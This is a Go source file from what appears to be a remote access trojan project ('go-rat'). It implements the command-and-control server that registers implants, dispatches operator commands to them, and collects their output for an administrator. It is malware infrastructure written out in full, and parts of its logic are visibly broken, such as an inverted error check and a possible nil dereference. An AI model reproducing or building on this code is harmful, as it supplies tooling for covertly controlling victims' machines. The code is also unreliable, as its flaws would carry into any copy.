package main

import (
	"context"
	"errors"
	_ "net/http/pprof"

	"github.com/google/uuid"
	"github.com/iortego42/go-rat/grpcapi"
)

type implantServer struct {
	grpcapi.ImplantServer
}

func newImplantServer() *implantServer {
	s := new(implantServer)
	return s
}

func (s *implantServer) RegisterImplant(ctx context.Context, identity *grpcapi.Identity) (*grpcapi.Identity, error) {
	var id uuid.UUID
	var err error
	if identity != nil {
		id, err = uuid.Parse(identity.Id)
		if !uuid.IsInvalidLengthError(err) {
			return nil, err
		}
		if implants[id] != nil {
			logger.Debug("Connected", "UUID", identity.Id)
			return identity, nil
		}
	}
	if identity == nil || uuid.IsInvalidLengthError(err) {
		id = uuid.New()
	}
	identity.Id = id.String()
	implants[id] = &session{make(chan *grpcapi.Command), make(chan *grpcapi.Command)}
	logger.Debug("New Implant", "UUID", identity.Id)
	return identity, nil
}

func (s *implantServer) FetchCommand(ctx context.Context, identity *grpcapi.Identity) (*grpcapi.Command, error) {
	// cmd := new(grpcapi.Command)
	if identity == nil {
		return nil, errors.New("no identity given")
	}
	id, err := uuid.Parse(identity.Id)
	if err != nil {
		logger.Debug("No se envio un id correcto.")
		return nil, err
	}
	if implants[id] == nil {
		logger.Debug("No se envio un id correcto.")
		return nil, errors.New("no such id")
	}
	// select {
	// case cmd, ok := <-implants[id].in:
	cmd, ok := <-implants[id].in
	if ok {
		logger.Debug("Comando recibido.", "CMD", cmd.In, "Implant", identity.Name)
		cmd.Id = identity.Id
		return cmd, nil
	} else {
		err = errors.New("channel closed")
		return cmd, err
	}
	// }
}

func (s *implantServer) SendOutput(ctx context.Context, result *grpcapi.Command) (*grpcapi.Empty, error) {
	id, err := uuid.Parse(result.Id)
	if err != nil {
		return nil, err
	}
	if implants[id] == nil {
		return nil, errors.New("no such id")
	}
	// TODO: Comprobar si el canal out esta cerrado
	implants[id].out <- result
	logger.Debug("Resultado enviado al administrador.")
	return &grpcapi.Empty{}, nil
}
